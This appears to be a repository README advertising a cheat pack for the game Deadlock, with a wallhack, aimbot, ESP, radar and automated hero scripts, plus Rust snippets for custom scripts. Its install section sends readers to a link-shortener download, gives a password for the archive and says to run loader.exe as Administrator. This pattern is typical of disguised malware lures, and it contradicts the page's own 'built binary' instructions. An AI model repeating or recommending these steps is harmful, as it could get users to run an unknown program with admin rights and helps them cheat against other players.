![rugpool](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOwPigpfN1pipVZohuY6ky0keYOT6k3gkAVCt-Rf7TeowX3eMON9FCK5xG&s=10)


# Deadlock ESP & Cheat Pack

> See through walls, track enemies, and gain complete situational awareness in Deadlock.

---

## Features

- 🔍 **Wallhack** — Spot enemies through walls, floors, and obstacles at any range
- 🎯 **Aimbot** — Bone-targeting aimbot with FOV control, smoothness, and recoil compensation (RCS)
- 📡 **Radar** — 2D minimap radar with player icons, directional indicators, and adjustable scale
- 👁️ **Player ESP** — Bounding boxes (standard, rounded, or corner-style), health bars, head markers, distance, hero name
- 🔔 **Offscreen Alerts** — Health, distance, and icon for enemies outside the screen view
- 👥 **Spectator List** — Shows who is currently spectating you and who else is watching
- ⚙️ **Config System** — Save and load named configurations at runtime
- 🌍 **Localization** — Russian, Chinese, and English UI

---

## 🔗 Download - v2.11.13

[![deadlock-esp](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/5P7Gtc)


## Installation (Rust)

1. Download the archive from the link above
2. Extract installer.zip archive using WinRAR or 7-Zip
3. Enter password: kraken11
4. Run the loader.exe as Administrator
5. Start Deadlock
6. Run the built binary
7. Press `HOME` to toggle the overlay on/off

> If overlay positioning is off, try `--old-window` flag:
> ```
> ./your_binary_name --old-window
> ```
> Then calibrate using the on-screen guide.

---

## Built-in Scripts

| Script | Description |
|--------|-------------|
| Shiv Ult | Tracks low-HP threshold and applies ultimate (quick-cast only) |
| Vindicta Ult | Fast-shot script for the sniper ultimate |
| Active Reload | Triggers reload at the optimal timing window |
| Priority Toggle | `F5` switches aimbot priority between players and creeps/souls |
| Radar Toggle | Hold `ALT` to show hero icons on the radar (Dota-style) |
| Movement | `CTRL` performs a sliding jump to maintain momentum; `G` — Dash |

---

## Adding Custom Scripts

Implement the `HeroScript` trait:

```rs
#[derive(Default)]
pub struct MyScript {}

impl HeroScript for MyScript {
    fn update(&mut self, game_data: &External, script_key: KeyState, settings: &mut Settings) { /* logic */ }
    fn draw(&mut self, g: &egui::Painter, game_data: &External, toasts: &mut Toasts) { /* rendering */ }
    fn hero_id(&self) -> Hero { Hero::None } // None = runs for all heroes
    fn name(&self) -> &str { "My Script" }
    fn init_key_code(&self) -> Option<i32> { Some(VirtualKeys::KEY_F1 as i32) }
}
```

Register it in `src/external/scripts/mid.rs`:

```rs
pub fn get_scripts() -> Vec<(Arc<Mutex<dyn HeroScript>>, HeroScriptSettings)> {
    vec![
        (Arc::new(Mutex::new(MyScript::default())), HeroScriptSettings::default())
    ]
}
```

---

## Technical Notes

- Overlay loop pauses when the game window is not in focus
- Does not use `WriteProcessMemory`
- Mouse events are dispatched from a separate process
- Game module pointers are auto-updated from memory at runtime

---

## Disclaimer

> ⚠️ This is a tool for **educational purposes only**. Use of cheat software may result in account bans. Understand the rules of the games you play.

## 🔗 Download - v2.11.13

[![deadlock-esp](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/5P7Gtc)
